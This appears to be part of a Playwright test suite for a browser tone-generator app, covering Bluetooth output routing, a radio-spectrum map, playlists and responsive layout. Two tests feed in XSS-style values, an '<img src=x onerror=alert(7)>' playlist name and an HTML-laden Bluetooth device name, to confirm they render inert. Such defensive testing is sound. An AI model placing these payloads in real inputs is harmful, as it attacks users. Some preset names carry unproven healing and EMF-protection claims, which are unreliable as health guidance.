    await p.click('#toastact'); await wait(300);
    check('connect', '"use it" routes every tone + remembers', await ev(p, () => tones.every(t => t.deviceId === 'bt-jbl') && localStorage.getItem('shepherd.freq.out') === 'bt-jbl'));
    check('connect', 'status now names the speaker, guide closed', (await p.textContent('#connname')).includes('JBL') && await p.isHidden('#guide'));
    check('connect', 'device marked "in use"', await ev(p, () => !!document.querySelector('.dev.using .tag.in')));
    await addLib(p, 'solfeggio 528 Hz');
    check('connect', 'new tones go to the chosen device', await ev(p, () => tones.at(-1).deviceId === 'bt-jbl'));
    await p.click('.ctab[data-sub=spk]');
    await p.click('.dev:has-text("JBL") [data-test]'); await wait(300);
    check('connect', 'test chime plays without errors', await ev(p, () => ENG.ctx && ENG.ctx.state === 'running') && p.errors.length === 0, p.errors.join(' | '));
    await p.click('.dev:has-text("Built-in") [data-use]'); await wait(200);
    check('connect', 'per-device "use" button switches output', await ev(p, () => tones.every(t => t.deviceId === 'spk1')));
    await p.click('.dev:has-text("JBL") [data-use]'); await wait(200);
    await p.reload(); await wait(1200); await p.click('.ctab[data-sub=spk]');
    check('connect', 'preference remembered; falls back while the speaker is away', await ev(p, () => localStorage.getItem('shepherd.freq.out') === 'bt-jbl' && tones.every(t => t.deviceId === 'default')));
    await ev(p, () => { window.__outs.push({ kind: 'audiooutput', deviceId: 'bt-jbl', label: 'JBL Flip 5 (Bluetooth)' }); navigator.mediaDevices.dispatchEvent(new Event('devicechange')); });
    await wait(400);
    check('connect', 'speaker reconnects → tones return to it automatically', await ev(p, () => tones.every(t => t.deviceId === 'bt-jbl')) && (await p.textContent('#connname')).includes('JBL'));
    await ev(p, () => { window.__outs = window.__outs.filter(d => d.deviceId !== 'bt-jbl'); navigator.mediaDevices.dispatchEvent(new Event('devicechange')); });
    await wait(300);
    check('connect', 'device disconnects → tones fall back to default', await ev(p, () => tones.every(t => t.deviceId === 'default')) && !(await p.textContent('#connname')).includes('JBL'));
    await p.click('#connbtn'); await p.click('#g3test'); await wait(200);
    check('connect', 'guide test-sound button works', p.errors.length === 0);
    await ctx.close();

    for (const [ua, os, linkPrefix, routes] of [
      ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36', 'windows', 'ms-settings:bluetooth', true],
      ['Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36', 'mac', 'x-apple.systempreferences:', true],
      ['Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Mobile Safari/537.36', 'android', 'intent:', true],
      ['Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1', 'ios', null, false],
    ]) {
      const c = await browser.newContext({ userAgent: ua, viewport: { width: 1440, height: 900 } });
      await c.addInitScript(() => { try { localStorage.setItem('shepherd.freq.ack', '1'); } catch (_) {} });
      const q = await c.newPage(); await q.goto(U); await wait(1000);
      await q.click('.ctab[data-sub=spk]'); await q.click('#connbtn'); await wait(150);
      const g = await ev(q, () => ({ t: document.getElementById('g2t').textContent, href: document.getElementById('g2open').hidden ? null : document.getElementById('g2open').getAttribute('href'), listen: !document.getElementById('listen').hidden, cap: document.getElementById('conncap').textContent }));
      const linkOk = linkPrefix ? (g.href || '').startsWith(linkPrefix) : g.href === null;
      check('connect', `${os}: tailored steps${linkPrefix ? ' + open-settings button' : ''}${routes ? '' : ' + "sound follows system" wording'}`, g.t.includes(os === 'ios' ? 'iphone' : os === 'mac' ? 'mac' : os) && linkOk && g.listen === routes && (routes || g.cap.includes('follows')), JSON.stringify(g));
      await c.close();
    }
  }

  // ── 8d · RADIOS + SPECTRUM MAP ────────────────────────────
  {
    const radioMocks = () => {
      Object.defineProperty(navigator, 'connection', { configurable: true, value: Object.assign(new EventTarget(), { type: 'wifi', effectiveType: '4g', downlink: 48, rtt: 30 }) });
      navigator.geolocation.getCurrentPosition = (ok) => setTimeout(() => ok({ coords: { latitude: 51.50739, longitude: -0.12776, accuracy: 9 } }), 50);
      const dev = Object.assign(new EventTarget(), { name: 'Pulse <b>Watch</b>\u202E', gatt: { connected: false,
        connect() { this.connected = true; return Promise.resolve(this); },
        disconnect() { this.connected = false; dev.dispatchEvent(new Event('gattserverdisconnected')); },
        getPrimaryService: async () => ({ getCharacteristic: async () => ({ readValue: async () => new DataView(new Uint8Array([87]).buffer) }) }) } });
      Object.defineProperty(navigator, 'bluetooth', { configurable: true, value: { getAvailability: async () => true, requestDevice: async () => dev } });
    };
    const { ctx, p } = await page({ init: radioMocks });
    await p.goto(U); await wait(1200);
    await p.click('.ctab[data-sub=spk]'); await wait(150);
    check('radios', 'connect tab renamed and shows radios', (await p.textContent('.ctab[data-sub=spk]')) === 'connect' && await p.isVisible('.radios'));
    check('radios', 'network: WiFi · 4G-class · 48 Mbps · 30 ms', (await p.textContent('#netinfo')) === 'WiFi · 4G-class speed · ~48 Mbps · 30 ms', await p.textContent('#netinfo'));
    check('radios', 'WiFi bands marked live', await ev(p, () => ['wifi24', 'wifi5', 'wifi6e'].every(k => live.get(k) === 'network')));
    await p.click('#gpsbtn'); await wait(300);
    check('radios', 'GPS fix shown rounded (~100 m) with accuracy', (await p.textContent('#gpsinfo')) === '±9 m · 51.507, -0.128 · satellite-grade fix', await p.textContent('#gpsinfo'));
    check('radios', 'GPS band live; position never stored', await ev(p, () => live.get('gps') === 'gps' && !JSON.stringify(localStorage).includes('51.50')));
    await p.click('#blebtn'); await wait(300);
    check('radios', 'bluetooth: find → connect → battery; hostile name inert', (await p.textContent('#bleinfo')) === 'connected · Pulse <b>Watch</b> · battery 87 %' && (await p.$$('#bleinfo b')).length === 0, await p.textContent('#bleinfo'));
    check('radios', 'bluetooth band live while connected', await ev(p, () => live.get('bt') === 'ble') && (await p.textContent('#blebtn')) === 'disconnect');
    await p.click('#blebtn'); await wait(150);
    check('radios', 'disconnect clears it', await ev(p, () => !live.has('bt')) && (await p.textContent('#bleinfo')).includes('disconnected'));
    await ev(p, () => { navigator.connection.type = 'cellular'; navigator.connection.dispatchEvent(new Event('change')); });
    check('radios', 'network change → cellular bands live', await ev(p, () => ['lte', 'nr6', 'mmw'].every(k => live.has(k)) && !live.has('wifi24')));

    await p.click('#specopen'); await wait(400);
    const sp = await ev(p, () => ({ bands: document.querySelectorAll('.sp-band').length, on: [...document.querySelectorAll('.sp-band.on')].map(g => g.dataset.k).sort().join(), audio: !!document.querySelector('.sp-audio'), ticks: document.querySelectorAll('.sp-tick').length }));
    check('spectrum', 'map: 12 bands, audio tier, 11 decade ticks', sp.bands === 12 && sp.audio && sp.ticks === 11, JSON.stringify(sp));
    check('spectrum', 'live bands lit (cellular + GPS)', sp.on === 'gps,lte,mmw,nr6', sp.on);
    const ov = await ev(p, () => { const r = [...document.querySelectorAll('.sp-band')].map(g => g.querySelector('.sp-lbl').getBBox()).map(b => [b.x, b.y, b.x + b.width, b.y + b.height]); let n = 0; for (let i = 0; i < r.length; i++) for (let j = i + 1; j < r.length; j++) if (r[i][0] < r[j][2] && r[j][0] < r[i][2] && r[i][1] < r[j][3] && r[j][1] < r[i][3]) n++; return n; });
    check('spectrum', 'no overlapping band labels', ov === 0, ov);
    const order = await ev(p, () => { const xs = SPECTRUM.map(b => xOf(bandCenter(b))); return xOf(20) < xOf(20000) && xOf(20000) < xs[0] && xs[0] < xs[1]; });
    check('spectrum', 'log axis order: audio < AM < FM', order);
    await p.click('.sp-band[data-k=mmw]'); await wait(150);
    const d = await p.textContent('#specdetail');
    check('spectrum', 'detail: 5G mmWave, wavelength ~7.8 mm, octave link', d.includes('5G mmWave') && d.includes('7.9 mm') && /\d+ octaves above/.test(d), d.slice(0, 160));
    await p.focus('.sp-band[data-k=fm]'); await p.keyboard.press('Enter'); await wait(100);
    check('spectrum', 'keyboard select works', (await p.textContent('.sd-hd b')) === 'FM radio');
    await p.hover('.sp-band[data-k=am] .sp-bar'); await wait(100);
    check('spectrum', 'hover tooltip', await p.isVisible('#spectip') && (await p.textContent('#spectip')).startsWith('AM radio'));
    await p.click('#specview .sbtn[data-v=table]'); await wait(100);
    check('spectrum', 'table view: audio row + 12 bands', (await p.$$('#spectable tbody tr')).length === 13 && await p.isHidden('#specmap'));
    await p.click('#specview .sbtn[data-v=map]');
    const t = await ev(p, () => transpose(2.4e9));
    check('spectrum', 'octave transposition (2.4 GHz → 286.1 Hz, 23 oct)', t.n === 23 && Math.abs(t.hz - 286.1) < 0.1, JSON.stringify(t));
    await p.click('#sdhear'); await wait(600);
    check('spectrum', '"hear it" adds + plays the stand-in, closes map', await ev(p, () => tones.some(x => x.cat === 'spectrum' && x.playing && /FM radio/.test(x.name))) && await p.isHidden('#spec'));
    check('spectrum', 'spectrum entries in library, tagged audio stand-in', await ev(p, () => FREQ.filter(f => f.cat === 'spectrum').length === 12 && groupOf('spectrum').ev === 'audio stand-in'));
    check('spectrum', 'no page errors', p.errors.length === 0, p.errors.join(' | '));
    await ctx.close();

    const c2 = await browser.newContext(); await c2.addInitScript(() => { try { delete Navigator.prototype.bluetooth; } catch (_) {} Object.defineProperty(navigator, 'bluetooth', { value: undefined, configurable: true }); });
    const q = await c2.newPage(); await q.goto(U); await wait(900); await q.click('.ctab[data-sub=spk]'); await q.click('#blebtn'); await wait(100);
    check('radios', 'no Web Bluetooth → clear browser guidance', (await q.textContent('#bleinfo')).includes('Chrome or Edge'));
    await c2.close();
  }

  // ── 8e · PLAYLISTS ───────────────────────────────────────
  {
    const { ctx, p } = await page({ ack: false });
    await p.goto(U); await wait(1200);
    await p.click('.ctab[data-sub=combos]'); await wait(150);
    check('playlists', 'tab renamed "playlists"', (await p.textContent('.ctab[data-sub=combos]')) === 'playlists');
    const A = await ev(p, () => ASHERIN.items.map(i => [i.name, i.minutes, i.tones.map(t => t.hz + (t.channel[0])).join(' ')]));
    check('playlists', 'asherin.playlist: 6 stages in order', A.map(x => x[0]).join(' | ') === 'sleep / deep restoration | focus / cognition | meditation / presence | healing / recovery | EMF / magnetic protection | silence field (mute charge)', A.map(x => x[0]).join(' | '));
    check('playlists', 'sleep: delta 2 Hz binaural + Schumann 7.83 binaural + 528', A[0][2] === '100l 102r 200l 207.83r 528b', A[0][2]);
    check('playlists', 'focus: gamma 40 + beta 20 binaural + 432', A[1][2] === '300l 340r 200l 220r 432b', A[1][2]);
    check('playlists', 'meditation: theta 6 + alpha 10 + Schumann 7.83', A[2][2] === '200l 206r 300l 310r 150l 157.83r', A[2][2]);
    check('playlists', 'healing: PEMF-rate 10 + 528 + 7.83', A[3][2] === '250l 260r 528b 150l 157.83r', A[3][2]);
    check('playlists', 'EMF: Schumann 7.83 / 14.3 / 20.8', A[4][2] === '150l 157.83r 250l 264.3r 350l 370.8r', A[4][2]);
    check('playlists', 'silence field: 18.98 + 150 + 2500, short', A[5][2] === '18.98b 150b 2500b' && A[5][1] === 2, A[5].join(' / '));
    check('playlists', 'preset shown with every stage, intent and "what\'s known"', (await p.$$('.pl.builtin .pl-item')).length === 6 && (await p.$$('.pl.builtin .pl-known')).length === 6);
    check('playlists', 'skull marked on the silence-field stage only', await ev(p, () => [...document.querySelectorAll('.pl.builtin .pl-item')].map(li => li.classList.contains('sk')).join()) === 'false,false,false,false,false,true');
    await p.click('.pl.builtin button[data-a=play]'); await wait(200);
    check('playlists', 'play asks first-listen notice, then extreme caution', await p.isVisible('#ack'));
    await p.click('#ackyes'); await wait(250);
    check('playlists', '…then extreme caution (playlist contains skull stage)', await p.isVisible('#danger') && await ev(p, () => ENG.nodes.size === 0));
    await p.click('#dgyes'); await wait(700);
    const st = await ev(p, () => ({ id: plState?.id, i: plState?.i, n: ENG.nodes.size, hz: tones.map(t => t.hz + t.channel[0]).join(' '), wave: tones.every(t => t.waveform === 'sine'), status: document.getElementById('status').textContent }));
    check('playlists', 'stage 1 playing (5 tones, headphone pairs)', st.id === 'asherin' && st.i === 0 && st.n === 5 && st.hz === '100l 102r 200l 207.83r 528b' && st.wave, JSON.stringify(st));
    check('playlists', 'status + now-playing panel', st.status === 'asherin.playlist · sleep / deep restoration' && await p.isVisible('#plnow') && /\d+:\d\d left/.test(await p.textContent('#plleft')));
    await ev(p, () => { plState.endsAt = Date.now() - 1; }); await wait(1600);
    check('playlists', 'stage time up → auto-advances to stage 2', await ev(p, () => plState?.i === 1 && tones.some(t => t.hz === 432 && t.playing)));
    await p.click('#plnext'); await wait(500);
    check('playlists', 'next → stage 3', await ev(p, () => plState?.i === 2));
    await p.click('#plprev'); await wait(500);
    check('playlists', 'previous → stage 2', await ev(p, () => plState?.i === 1));
    await ev(p, () => { plState.i = 5; plState.endsAt = Date.now() - 1; }); await wait(1600);
    check('playlists', 'after the last stage it finishes (no loop)', await ev(p, () => plState === null && ENG.nodes.size === 0) && (await p.textContent('#toastmsg')).includes('finished'));

    // copy & edit
    await p.click('.pl.builtin button[data-a=dup]'); await wait(200);
    check('playlists', '"copy & edit" makes an editable copy', await ev(p, () => playlists.length === 1 && playlists[0].name === 'asherin.playlist copy' && playlists[0].items.length === 6));
    const card = '.pl:not(.builtin)';
    await p.fill(`${card} .pl-name`, 'my nights'); await p.press(`${card} .pl-name`, 'Tab'); await wait(100);
    await p.fill(`${card} .pl-item >> nth=0 >> input[data-a=min]`, '45'); await p.press(`${card} .pl-item >> nth=0 >> input[data-a=min]`, 'Tab'); await wait(100);
    check('playlists', 'rename + set minutes', await ev(p, () => playlists[0].name === 'my nights' && playlists[0].items[0].minutes === 45));
    await p.click(`${card} .pl-item >> nth=1 >> [data-a=up]`); await wait(100);
    check('playlists', 'reorder', await ev(p, () => playlists[0].items[0].name === 'focus / cognition'));
    await p.click(`${card} .pl-item >> nth=5 >> [data-a=rm]`); await wait(100);
    check('playlists', 'remove a stage', await ev(p, () => playlists[0].items.length === 5));
    await p.click(`${card} [data-a=loop]`); await wait(100);
    check('playlists', 'loop toggle', await ev(p, () => playlists[0].loop === true));
    await ev(p, () => { tones = []; renderTones(); });   // start from an empty mix (432 may still be loaded from "focus")
    await addLib(p, 'Verdi A (432 Hz)'); await p.click('.ctab[data-sub=combos]');
    await p.click(`${card} [data-a=addmix]`); await wait(100);
    check('playlists', 'add current mix as a stage', await ev(p, () => playlists[0].items.length === 6 && playlists[0].items[5].tones.map(t => t.hz).join() === '432'));
    await p.click('.pl.builtin .pl-item >> nth=2 >> [data-a=keep]'); await wait(150);
    check('playlists', 'preset stage → saved combo', await ev(p, () => combos.some(c => c.name === 'meditation / presence')));
    await p.selectOption(`${card} select[data-a=addcombo]`, { label: 'meditation / presence' }); await wait(150);
    check('playlists', 'add a saved combo as a stage', await ev(p, () => playlists[0].items.length === 7 && playlists[0].items[6].name === 'meditation / presence'));
    await ev(p, () => { tones = []; renderTones(); });
    await p.click(`${card} button[data-a=play]`); await wait(600);
    await ev(p, () => { plState.i = playlists[0].items.length - 1; plState.endsAt = Date.now() - 1; }); await wait(1600);
    check('playlists', 'loop wraps to stage 1', await ev(p, () => plState?.i === 0));
    await p.click('#stopallbtn'); await wait(1300);
    check('playlists', 'manual "stop all" also ends the playlist', await ev(p, () => plState === null) && await p.isHidden('#plnow'));
    await p.reload(); await wait(1200); await p.click('.ctab[data-sub=combos]');
    check('playlists', 'saved locally — survives reload', await ev(p, () => playlists.length === 1 && playlists[0].name === 'my nights' && playlists[0].loop && playlists[0].items.length === 7 && !!localStorage.getItem('shepherd.freq.playlists.v1')));
    const [dl] = await Promise.all([p.waitForEvent('download'), p.click('#comboexp')]);
    const f = path.join(tmp, 'library.json'); await dl.saveAs(f);
    check('playlists', 'export includes playlists (not the built-in)', (() => { const j = JSON.parse(fs.readFileSync(f, 'utf8')); return j.playlists?.length === 1 && j.playlists[0].name === 'my nights'; })());
    await p.click(`${card} [data-a=del]`); await wait(100);
    check('playlists', 'delete', await ev(p, () => playlists.length === 0));
    await p.click('#toastact'); await wait(100);
    check('playlists', 'undo delete', await ev(p, () => playlists.length === 1));
    await ev(p, () => { playlists.length = 0; savePlaylists(); renderPlaylists(); });
    await p.setInputFiles('#combofile', f); await wait(300);
    check('playlists', 'import restores the playlist', await ev(p, () => playlists.length === 1 && playlists[0].items.length === 7) && (await p.textContent('#toastmsg')).includes('1 playlist'));
    const evil = path.join(tmp, 'evilpl.json');
    fs.writeFileSync(evil, JSON.stringify({ playlists: [{ name: '<img src=x onerror=alert(7)>', loop: 'yes', items: [{ name: '<b>x</b>', minutes: 99999, tones: [{ hz: 300 }, { hz: 'nope' }] }, { tones: [] }] }, { name: 'asherin.playlist', items: [{ tones: [{ hz: 1 }] }] }] }));
    await p.setInputFiles('#combofile', evil); await wait(300);
    const ep = await ev(p, () => { const x = playlists.find(q => q.name.startsWith('<img')); return x && { loop: x.loop, items: x.items.length, min: x.items[0].minutes, tones: x.items[0].tones.length, imgs: document.querySelectorAll('#pllist img').length, fake: playlists.filter(q => q.name === 'asherin.playlist').length }; });
    check('playlists', 'hostile import: inert, clamped, no fake preset', ep && ep.loop === false && ep.items === 1 && ep.min === 180 && ep.tones === 1 && ep.imgs === 0 && ep.fake === 0, JSON.stringify(ep));
    check('playlists', 'no page errors / dialogs', p.errors.length === 0 && p.dialogs.length === 0, p.errors.join(' | '));
    await ctx.close();
  }

  // ── 9 · RESPONSIVE ───────────────────────────────────────
  for (const [w, h, mobile] of [[1920, 947, 0], [1440, 900, 0], [1100, 640, 0], [820, 1180, 1], [390, 844, 1], [844, 390, 1], [360, 640, 1]]) {
    const { ctx, p } = await page({ vp: { width: w, height: h }, mobile: !!mobile });
    await p.goto(U); await wait(1300);
    const over = await ev(p, () => document.documentElement.scrollWidth > innerWidth || document.body.scrollWidth > innerWidth);
    check('responsive', `${w}×${h}: no horizontal overflow`, !over);
    const compact = await ev(p, () => isCompact());
    if (compact) {
      for (const tab of ['lib', 'int', 'main', 'ins', 'spk']) {
        await p.click(`.mobt[data-tab=${tab}]`); await wait(350);
        const vis = await ev(p, t => { const id = t === 'main' ? 'panel-main' : (t === 'lib' || t === 'int') ? 'panel-lib' : 'panel-spk'; const r = document.getElementById(id).getBoundingClientRect(); return r.height > 80 && r.bottom <= innerHeight + 1; }, tab);
        check('responsive', `${w}×${h}: tab "${tab}" visible`, vis);
      }
      await p.click('.mobt[data-tab=int]'); await p.click('#panel-lib .ctab[data-sub=mute]'); await wait(200);
      check('responsive', `${w}×${h}: mute charge reachable`, await p.isVisible('.charge'));
      await p.click('.mobt[data-tab=ins]'); await p.click('#panel-spk .ctab[data-sub=combos]'); await wait(200);
      check('responsive', `${w}×${h}: combos reachable`, await p.isVisible('#combosave'));
    } else {
      check('responsive', `${w}×${h}: both columns + stage visible`, await p.isVisible('#panel-lib') && await p.isVisible('#panel-spk') && await p.isVisible('.vista'));
    }
    check('responsive', `${w}×${h}: no page errors`, p.errors.length === 0, p.errors.join(' | '));
    await ctx.close();
  }
} catch (e) {
  check('runner', 'suite crashed', false, e.stack?.split('\n').slice(0, 3).join(' '));
} finally {
  await browser.close(); server.kill(); evil.close();
}

let group = '';
for (const r of results) {
  if (r.group !== group) { group = r.group; console.log(`\n${group}`); }
  console.log(`  ${r.ok ? 'PASS' : 'FAIL'}  ${r.name}${r.ok || !r.detail ? '' : `  → ${r.detail}`}`);
}
const failed = results.filter(r => !r.ok).length;
console.log(`\n${results.length - failed}/${results.length} passed`);
process.exit(failed ? 1 : 0);
